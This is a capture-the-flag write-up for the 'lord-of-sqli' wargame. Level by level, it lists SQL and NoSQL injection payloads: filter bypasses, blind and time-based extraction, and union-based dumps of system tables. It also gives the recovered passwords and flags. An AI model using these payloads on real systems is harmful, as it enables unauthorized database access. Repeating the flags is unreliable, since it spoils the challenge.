# lord-of-sqli

#1 GREMLIN<br />
pw='or'1'='1
%27%20or%20%271%27=%271%27%20--%20

Some SQL parsers might not interpret -- if there is no space after.

#2 COBOLT<br />
id=admin%27%20--%20

#3 GOBLIN<br />
%27, &apos, &#39, \u0027, char(39) doesn't work.<br />
bypassing quote filter doesn't work -> have to think some other way to query admin.

no=2%20or%20no=2

#4 ORC<br />
pw=1' or id='admin'-- doesn't work.<br />
It is converted to pw=1\' or id=\'admin\'-- by addslashes function.<br />
It was not possible to find a way to bypass addslashes function.

1' or id='admin' and length(pw)=8 -- '<br />
I found the pw length. It is possible to bruteforce 8 chars.<br />
REL orc.py, pw=095a9852

#5 WOLFMAN<br />
Can't use whitespace.<br />
tab(%09) works.<br />
Also, LF(%0a), CR(%0d), /**/  works.

1%27%09or%09id=%27admin%27%09--%09

#6 DARKELF<br />
OR can be used as ||, AND can be used as &&<br />
However, && should be inputed as URL encoding form(%26).<br />
' || id='admin

#7 ORGE<br />
Combination of #4 and #6.<br />
REL orge.py, pw=7b751aec

#8 TROLL<br />
Trapped in bypassing single quote filter, but never worked. (cost 2+ Hours..)<br />
It was quite simple quiz, that just bypass admin string filter.<br />
ad\min, ADmin, ... 

#9<br />
same.<br />
ad\min works great.

#10<br />
easiest quiz.<br />
' or id='admin' -- 

#11 <br />
substr and = are not allowed.<br />
I was able to use 'LIKE'.<br />
However, it has one problem. <br />
Like are not case sensitive, so that my codes always return capitalized word.<br />
We can use mid() instead of substr() :)

#12<br />
1' and no=1 or no LIKE "2"<br />
We can find the no of admin.<br />
using same solution of #11, easily solved.

#13<br />
I did find the way in a second, using STRCMP and mid<br />
but, I kept 'no' variable empty.<br />
1\n||\nSTRCMP(id,"admin")\nIS\nFALSE\n&&\nSTRCMP(mid(pw,{i},1),char({j}))\nIS\nFALSE<br />
must give a parameter to equal variables.<br />
REL bugbear.py, pw=52dc3991<br />
* Capital letter, lower letter distinguishability check


#14<br />
%0b %0c -> space!<br />
REL giant.py

#15<br />
cutie quiz.<br />
use % and _ to guess the pw.<br />
pw=%d__

#16<br />
\&pw=or 1=1 -- <br />
using escape function!

#17<br />
"&pw=%20--%201=1%20ro<br />
using escape function!

#18<br />
pw=')=0;%00<br />
We can use double equation on this problem.<br />
pw=''=0  is interpreted as False=0 so it is true.<br />
and ;%00 is kind of delimiting sql query.

#19<br />
It may not be ascii.<br />
length(substr(pw,1,1))=4<br />
It was an unicode, REL xavis.py<br />
pw=우왕굳

* There was some brilliant approach.<br />
(select @a:=pw where id='admin') union select @a<br />

#20<br />
quite annoying problem.<br />
Had to escape comment.<br />
The only wayt to escape comment is to end line.

and pw=' and pw='' or id='admin' -- '<br />
so the query would be interpreted like,<br />
select id from prob_dragon where id='guest'# and pw='<br />
and pw='' or id='admin'

#21<br />
filtering sleep was a big HINT!!!<br />
I need to conduct Error Based Blind SQLI.<br />
length of password was 32.<br />
REL iron_golem.py, pw=06b5a6c16e8830475f983cc3a825ee9a

#22<br />
error based blind sqli using (select 1 union select )

#23, #24<br />
order by can get multiple arguments<br />
we can use "order by email='**'" as if phrase.

#25<br />
\&pw=%20union%20select%200x5c,0x756e696f6e2073656c65637420636861722839372c3130302c3130392c3130352c3131302923%23

prob_green_dragon table was empty.<br />
Need to put data using union select. TWICE.<br />
But, maybe due to interpreting method, we need to use ascii code when inputing twice.<br />
and ofcourse we can bypass single quote filtering by using CHAR()

#26<br />
SELECT id FROM prob_red_dragon WHERE id=''||no>#' and no=\n1000<br />
can bypass is_numeric<br />
no can be guessed by binary search. REL red_dragon.py

#27<br />
REL blue_dragon.py

#28<br />
REL frankenstein.py

#29<br />
At first, I thought inserting <br />
no, ip, (select email from prob_phantom where no=1) <br />
works. But it didn't. I had to rename the table like "from prob_phantom as p"<br />
and my vpn keep changing my ip so, i have to manually throw the request.<br />
It is not neccessary to use "as" it's possible to use "from prob_phantom tmp"

#30<br />
using quine code.

a' union select replace(replace('a" union select replace(replace("$",char(34),char(39)),char(36),"$") as pw%23',char(34),char(39)),char(36),'a" union select replace(replace("$",char(34),char(39)),char(36),"$") as pw%23') as pw%23

#31<br />
using information_schema.processlist<br />
1' union select substr(info,locate('1',info),length(info)-locate('1',info)) from information_schema.processlist#<br />
REL rubiya's blog.

#32

#33<br />
-1'<@=1 or {a 1}=1 or '

#34<br />
-1'<@=1 or id like 'ad%' or '

#35<br />
-1'<@=1 or length(pw)=8 or '

#36<br />
-1'<@=1 union/**/select 'first', 'second'#

#37<br />
' or id='admin

#38<br />
admin\' or id=char(97,100,109,105,110)--%20

#39 <br />
1' or substr(pw,2,1)='4' -- ' <br />
REL banshee.py

#40 <br />
' union select name from sqlite_master -- ' <br />
flag_70c81d99 <br />
' union select * from flag_70c81d99 -- ' <br />
FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}

#41 <br />
admin' and pw='' or id='admin' and pw=1 -- ' <br />
select id from prob_nessie where id='admin' and 1=(case when len(pw)=16 then 's' end) -- ' and pw='' <br />
115d8d1a422f1f3e

#42 <br />
admin' and pw='' or id='admin' and pw=1 -- ' <br />
bae18ae1221fafd3

#43 <br />
' if((select len(pw) from prob_yeti where id='admin')=16) waitfor delay '0:0:3' -- ' <br />
REL yeti.py

#44 <br />
using [] works!! <br />
select[pw]from[prob_mummy]where[id]='admin'and[pw]like'________________' <br />
REL mummy.py

#45 <br />
1' union select name from sysobjects where xtype='U' -- ' <br />
: flag_34d1a7f3bb77c91e <br />
1' union select id from sysobjects where name='flag_34d1a7f3bb77c91e' -- ' <br />
: 597577167 <br />
1' union select name from syscolumns where id=597577167 -- ' <br />
: wrongflag <-------------- fucking trap <br />
1' union select name from syscolumns where id=597577167 and name <>'wrongflag' -- ' <br />
: there was no output!!! may be flag is on other table.... <br />
1' union select name from sysobjects where name<>'flag_34d1a7f3bb77c91e' and xtype='U' -- ' <br />
: flag_a98fbc3d1d46a81e <br />
1' union select id from sysobjects where name='flag_a98fbc3d1d46a81e' -- ' <br />
: 613577224 <br />
1' union select name from syscolumns where id=613577224 -- ' <br />
: flag <br />
1' union select flag from flag_a98fbc3d1d46a81e -- ' <br />
: FLAG{a0819fc56beae985bac7d175c974cd27} <br />

GOOD reference about mssql : https://whatdocumentary.tistory.com/8

#46 <br />
id=admin&pw[$ne]=null

#47 <br />
id=admin&pw[$regex]=^.{8}$

REL siren.py

#48 <br />
' || obj.id=='admin'&&obj.pw.length==8 ? not : '1';}"}
